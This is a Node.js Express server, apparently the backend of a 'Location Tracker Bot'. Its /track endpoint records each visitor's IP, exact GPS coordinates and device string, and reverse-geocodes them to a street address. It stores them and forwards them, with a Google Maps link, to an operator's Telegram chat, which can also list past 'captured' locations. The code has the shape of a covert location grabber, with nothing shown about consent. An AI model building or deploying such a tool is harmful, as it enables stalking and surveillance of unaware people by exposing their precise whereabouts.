const express = require('express');
const axios   = require('axios');
const fs      = require('fs');
const path    = require('path');

const app        = express();
const BOT_TOKEN  = process.env.BOT_TOKEN;
const CHAT_ID    = process.env.CHAT_ID;
const PORT       = process.env.PORT || 3000;
const DATA_FILE  = path.join(__dirname, 'locations.json');
const START_TIME = Date.now();

app.use(express.json());
app.use(express.static('public'));

// ─── JSON Helpers ───────────────────────
function loadLocations() {
  if (!fs.existsSync(DATA_FILE)) return [];
  try { return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); }
  catch { return []; }
}
function saveLocation(entry) {
  const all = loadLocations();
  all.push(entry);
  fs.writeFileSync(DATA_FILE, JSON.stringify(all, null, 2));
}

// Init from existing data
let lastDetectedTime = null;
let totalDetected    = 0;
const _existing      = loadLocations();
totalDetected        = _existing.length;
if (_existing.length > 0) lastDetectedTime = _existing[_existing.length - 1].timestamp;

// ─── Telegram Helper ─────────────────────
async function tg(chatId, text) {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
  } catch (e) { console.error('TG error:', e.message); }
}

// ─── Bot Commands ────────────────────────
async function handleCommand(msg) {
  const chatId = msg.chat.id.toString();
  const text   = (msg.text || '').trim();

  if (text === '/start' || text === '/help') {
    await tg(chatId, `
🤖 *Location Tracker Bot*
━━━━━━━━━━━━━━━━━━━━
/locations — Last 5 locations
/locations 10 — Last N locations
/last — Most recent detection
/health — Bot status & uptime
/help — This menu
━━━━━━━━━━━━━━━━━━━━`);

  } else if (text === '/health') {
    const upSec  = Math.floor((Date.now() - START_TIME) / 1000);
    const h = Math.floor(upSec / 3600);
    const m = Math.floor((upSec % 3600) / 60);
    const s = upSec % 60;
    const fileKB = fs.existsSync(DATA_FILE)
      ? (fs.statSync(DATA_FILE).size / 1024).toFixed(2) + ' KB' : '0 KB';
    const lastTime = lastDetectedTime
      ? new Date(lastDetectedTime).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
      : 'None yet';

    await tg(chatId, `
✅ *BOT HEALTH CHECK*
━━━━━━━━━━━━━━━━━━━━
🟢 Status         : Online
⏱️ Uptime         : ${h}h ${m}m ${s}s
👥 Total Captured : ${totalDetected}
🕐 Last Detection : ${lastTime}
💾 Storage Size   : ${fileKB}
━━━━━━━━━━━━━━━━━━━━`);

  } else if (text === '/last') {
    const all = loadLocations();
    if (all.length === 0) { await tg(chatId, '📭 No locations yet.'); return; }
    const loc  = all[all.length - 1];
    const time = new Date(loc.timestamp).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    await tg(chatId, `
📌 *LAST DETECTED LOCATION*
━━━━━━━━━━━━━━━━━━━━
⏰ Time     : ${time}
🌐 IP       : \`${loc.ip}\`
Latitude  : \`${loc.latitude}\`
Longitude : \`${loc.longitude}\`
Accuracy  : ±${Math.round(loc.accuracy || 0)}m
🏙️ Location : ${loc.address || '—'}
🔗 [Open in Google Maps](https://maps.google.com/?q=${loc.latitude},${loc.longitude})
━━━━━━━━━━━━━━━━━━━━`);

  } else if (text.startsWith('/locations')) {
    const all = loadLocations();
    if (all.length === 0) { await tg(chatId, '📭 No locations yet.'); return; }
    const n      = parseInt(text.split(' ')[1]) || 5;
    const recent = all.slice(-n).reverse();

    let reply = `📋 *LAST ${recent.length} LOCATIONS* (total: ${all.length})\n━━━━━━━━━━━━━━━━━━━━\n`;
    recent.forEach((loc, i) => {
      const time = new Date(loc.timestamp).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
      reply += `
*#${all.length - i}*
⏰ ${time}
🌐 IP: \`${loc.ip}\`
📌 \`${loc.latitude}, ${loc.longitude}\` ±${Math.round(loc.accuracy || 0)}m
🏙️ ${loc.city || '—'}, ${loc.country || '—'}
🔗 [Maps](https://maps.google.com/?q=${loc.latitude},${loc.longitude})
──────────────────────`;
    });
    reply += '\n\n💡 /locations 20 for more';
    await tg(chatId, reply);
  }
}

// ─── Long Polling ────────────────────────
let lastUpdateId = 0;
async function pollUpdates() {
  try {
    const res = await axios.get(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`,
      { params: { offset: lastUpdateId + 1, timeout: 30 }, timeout: 35000 }
    );
    for (const update of res.data.result) {
      lastUpdateId = update.update_id;
      if (update.message?.text) handleCommand(update.message).catch(console.error);
    }
  } catch (e) { console.error('Poll error:', e.message); }
  setTimeout(pollUpdates, 1000);
}
pollUpdates();

// ─── Visitor Track Endpoint ───────────────
app.post('/track', async (req, res) => {
  const { latitude, longitude, accuracy, userAgent, timestamp } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

  const locData = { ip, latitude, longitude, accuracy, timestamp, userAgent };
  let locationBlock = 'Geocoding unavailable';

  try {
    const geo = await axios.get('https://nominatim.openstreetmap.org/reverse', {
      params: { lat: latitude, lon: longitude, format: 'json' },
      headers: { 'User-Agent': 'LocationTrackerBot/1.0' }
    });
    const a = geo.data.address;
    locData.city    = a.city || a.town || a.village || null;
    locData.country = a.country || null;
    locData.address = geo.data.display_name;

    locationBlock = `
🏠 Full Address : ${geo.data.display_name}
🏙️ City/Town    : ${a.city || a.town || a.village || '—'}
🏘️ Area/Suburb  : ${a.suburb || a.neighbourhood || '—'}
📍 District     : ${a.district || a.county || '—'}
🗺️ State        : ${a.state || '—'}
🌍 Country      : ${a.country || '—'} (${a.country_code?.toUpperCase() || '—'})
📮 Postcode     : ${a.postcode || '—'}`;
  } catch (e) { console.error('Geocode fail:', e.message); }

  saveLocation(locData);
  lastDetectedTime = timestamp;
  totalDetected++;

  const msg = `
📡 *NEW VISITOR DETECTED*
━━━━━━━━━━━━━━━━━━━━
🌐 IP Address : \`${ip}\`
⏰ Time       : ${new Date(timestamp).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}

📌 *EXACT COORDINATES*
Latitude  : \`${latitude}\`
Longitude : \`${longitude}\`
Accuracy  : ±${Math.round(accuracy || 0)}m

🗺️ *LOCATION DETAILS*
${locationBlock}

🖥️ Device : ${(userAgent || '').substring(0, 120)}

🔗 [Open in Google Maps](https://maps.google.com/?q=${latitude},${longitude})
━━━━━━━━━━━━━━━━━━━━`;

  await tg(CHAT_ID, msg);
  res.json({ status: 'ok' });
});

// ─── Keep-alive ping ─────────────────────
app.get('/ping', (req, res) => res.json({ status: 'alive', uptime: process.uptime() }));

app.listen(PORT, () => console.log(`✅ Running on port ${PORT}`));
